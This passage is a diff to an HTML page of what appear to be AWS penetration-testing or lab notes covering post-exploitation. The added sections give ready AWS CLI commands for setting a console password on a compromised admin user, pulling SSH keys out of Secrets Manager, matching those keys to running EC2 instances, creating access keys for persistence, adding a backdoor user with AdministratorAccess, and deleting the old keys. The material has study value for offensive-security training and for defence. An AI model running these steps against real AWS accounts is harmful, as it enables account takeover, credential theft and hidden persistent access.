@@ -85,7 +85,39 @@ nslookup 3.84.154.5</code></pre>
                     <p>Then check if you done it correctly. <b>Using the following command also provides you with the username of the account</b></p>
                     <pre><code class="language-bash">aws sts get-caller-identity --profile amethyst-admin</code></pre>
                     <b>Warning: Have in mind that this actions are logged</b> 
-                </ul>    
+                </ul>
+
+                <h3>Accessing the Web AWS Console</h3>
+                <ul>
+                    <p>In case you would like to acces the management console <a class="notion-link" href="https://eu-north-1.signin.aws.amazon.com/oauth?client_id=arn%3Aaws%3Asignin%3A%3A%3Aconsole%2Fcanvas&code_challenge=PZ9CSfhR_kcbXIOeIJnLuKktX1xCxInDkcANzEppXAw&code_challenge_method=SHA-256&response_type=code&redirect_uri=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Fca-oauth-flow-id%3D6ecb%26hashArgs%3D%2523%26isauthcode%3Dtrue%26nc2%3Dh_uta_mc%26oauthStart%3D1789504027124%26state%3DhashArgsFromTB_eu-north-1_7178e1de90dccc2c" target="_blank">here</a> you'll have to do some things</p>
+                    <p>First identify the ID of the account. To do so type the access key id and secret access key just like previously and using the following command show the info about the user</p>
+                    <pre><code class="language-bash">aws sts get-caller-identity --profile amethyst-admin</code></pre>
+                    <p>Then check if there are already a set of credentials for that username</p>
+                    <pre><code class="language-bash">aws iam get-login-profile --user-name admin-mason --profile amethyst-admin</code></pre>
+                    <p>If it isn't the case just create them</p>
+                    <pre><code class="language-bash">aws iam create-login-profile --user-name admin-mason --password 'TuPasswordTemporal123!' --no-password-reset-required --profile amethyst-admin</code></pre>
+                    <p>Finally access the console using the website</p>
+
+
+                    
+                </ul>
+            </ul>
+
+            <h2 id="Listing secrets">Listing secrets</h2>
+            <ul>
+                <p>Once you have aws credentials and a defined profile you can list secrets and check if there are credentials to potential EC2 instances</p>
+                <pre><code class="language-bash">aws secretsmanager list-secrets</code></pre>
+                <p>Then list the value of a secret</p>
+                <pre><code class="language-bash">aws secretsmanager get-secret-value --secret-id bastion-ssh-access-key-20260915054054 --profile compromised</code></pre>
+                <p>Then you can filter the reseult by using query and decoding the result. Just like this</p>
+                <pre><code class="language-bash">aws secretsmanager get-secret-value --secret-id bastion-ssh-access-key-20260915054054 --profile compromised --query "SecretString" --output text | base64 -d</code></pre>
+                <h3>SSH keys situations</h3>
+                <ul>
+                    <p>In case you find SSH keys i recommend you to check for the name of the secrets and then list ec2 instances to find a instance where you can use the key</p>
+                    <pre><code class="language-bash">aws ec2  describe-instances --filter Name=instance-state-name,Values=running --profile compromised --query 'Reservations[].Instances[].{Tags: Tags,PublicName: PublicDnsName,PublicIP:PublicIpAddress}'</code></pre>
+                    <p>I recommend you to check for the ami name in the AWS marketplace <a class="notion-link" href="https://aws.amazon.com/marketplace/search/results?searchTerms=ami-097947612b141c026" target="_blank">AWS Marketplace</a> in order to find a possible username for the key. You can always use <b>ssh-keygen -lf awskey</b> to check the comments</p>
+                    <p>For amazon linux default user is <b>ec2-user</b></p>
+                </ul>
             </ul>
 
             <h2 id="Buckets S3">Buckets S3</h2>
@@ -229,6 +261,31 @@ aws --profile target iam get-account-authorization-details  #Get all information
                         <pre><code class="language-bash">aws --profile CompromisedJenkins iam create-access-key --user-name backdoor</code></pre>
                     </ul>    
                 </ul>
+            </ul>
+
+            <h2 id="Privilege escalation">Privilege escalation</h2>
+            <ul>
+                <p>Just in case you achieved a shell access inside a compromised ec2 instance you should attempt to escalate your privileges comonly as another unix system eventhough there are some thing you can check specifically for aws environments</p>
+                <p>First check if you are root or can use sudo</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+                <p>Now check if you can run AWS cli commands</p>
+                <pre><code class="language-bash">aws sts get-caller-identity</code></pre>
+                <p>Now list AWS users</p>
+                <pre><code class="language-bash">aws iam list-users</code></pre>
+                <p>Identify a user with administrative privileges (commonly for the name) and create access keys for persistence</p>
+                <pre><code class="language-bash">aws iam create-access-key --user admin-mason</code></pre>
+                <p>Note that access keys and access the AWS environment from your local machine</p>
+            </ul>
+
+            <h2 id="Persistence">Persistence</h2>
+            <ul>
+                <p>With an administrative account the use the following commands to create persistent access:</p>
+                <p>Create a user</p>
+                <pre><code class="language-bash">aws iam create-user --user-name cicd --profile admin-mason</code></pre>
+                <p>Add administrator permissions to it</p>
+                <pre><code class="language-bash">aws iam attach-user-policy --user-name cicd --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile admin-mason</code></pre>
+                <p>Delete access keys for the previus user you have been using</p>
+                <pre><code class="language-bash">aws iam delete-access-key --user-name admin-mason --access-key-id AKIARLO3TVYSG6LN3GFT --profile admin-mason</code></pre>
             </ul>
         </div>
     </div>
